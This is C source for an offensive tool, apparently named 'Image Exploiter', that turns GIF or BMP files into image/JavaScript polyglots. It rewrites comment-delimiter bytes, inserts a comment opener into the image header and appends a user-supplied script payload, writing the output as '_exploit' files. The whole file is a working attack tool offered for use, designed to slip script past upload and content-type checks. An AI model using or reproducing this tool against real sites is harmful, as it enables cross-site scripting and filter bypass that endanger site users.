#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

#define MAX 500
void 
inject(char *payload, char *fname, char *format) {
   int src, dst;
   int firstTimeIn;
   char myPreviousChar;
   char myCurrentChar;
   char newFilename[MAX];

   strcpy(newFilename, fname);
   if (!strcmp(format, "gif")) strcat(newFilename, "_exploit.gif");
   else if (!strcmp(format, "bmp")) strcat(newFilename, "_exploit.bmp");
   else { printf("[-] Invalid File Format\n"); exit(0); }

#ifdef _WIN32
   src = open(fname, O_RDONLY | O_BINARY, 0);
   dst = open(newFilename, O_CREAT | O_TRUNC | O_WRONLY | O_BINARY, S_IREAD | S_IWRITE);

#elif __unix__
   src = open(fname, O_RDONLY, 0);
   dst = open(newFilename, O_CREAT | O_TRUNC | O_WRONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

#endif
   firstTimeIn = 1;

   while (read(src, &myCurrentChar, 1)) {
      if (firstTimeIn == 1) {
         firstTimeIn = 0;
         myPreviousChar = myCurrentChar;
      } else {
         if (((myPreviousChar == 0x2A) && (myCurrentChar == 0x2F)) \
          || ((myPreviousChar == 0x2F) && (myCurrentChar == 0x2A))) {
            myPreviousChar = 0x00;
            myCurrentChar = 0x00;
         }
         write(dst, &myPreviousChar, 1);
         myPreviousChar = myCurrentChar;
      }
   }

   write(dst, &myPreviousChar, 1);
 
   if(!strcmp(format, "gif")) lseek(dst, 6, SEEK_SET);
   else lseek(dst, 2, SEEK_SET);
   write(dst, "\x2F", 1);
   write(dst, "\x2A", 1);

   close(src);
   close(dst);
#ifdef _WIN32
   dst = open(newFilename, O_WRONLY | O_APPEND | O_BINARY, 0);

#elif __unix__   
   dst = open(newFilename, O_WRONLY | O_APPEND, 0);

#endif
   write(dst, "\x2A", 1);
   write(dst, "\x2F", 1);
   write(dst, "\x3D", 1);
   write(dst, "\x31", 1);
   write(dst, "\x3B", 1);

   write(dst, payload, strlen(payload));

   write(dst, "\x3B", 1);

   close(dst);
   printf("\n[+] Successfully written to %s\n", newFilename);
}

int 
main(int argc, char *argv[]) {
   int i;
   char *fileName;
   char *format;
   char *payloadString;

   printf(" _____                   \n");
   printf("|     |_____ ___ ___ ___ \n");
   printf("|-   -|     | .'| . | -_|\n");
   printf("|_____|_|_|_|__,|_  |___|\n");
   printf("                |___|    \n");
   printf("\t _____         _ ___ _ _           \n");
   printf("\t|   __|_ _ ___| |   |_| |_ ___ ___ \n");
   printf("\t|   __|_'_| . | | | | |  _| -_|  _|\n");
   printf("\t|_____|_,_|  _|_|___|_|_| |___|_|  \n");
   printf("\t          |_|                      \n");
   printf("\n[~] Author: Badass Elsa\n[~] Website: www.CyberTeamRox.org\n[~]\n");

   if (argc != 7)  {
      printf("\n[-] Usage: %s -i <image file name> -f <gif or bmp> -p <payload string> \n", argv[0]);
      return 1;
   }

   for (i = 1; i < argc; i++)  {
      if (!strcmp(argv[i], "-i")) fileName = argv[i+1];
      if (!strcmp(argv[i], "-f")) format = argv[i+1];
      if (!strcmp(argv[i], "-p")) payloadString = argv[i+1];     
      }
   
   inject(payloadString, fileName, format);
   return 0;
}
/*EOF*/
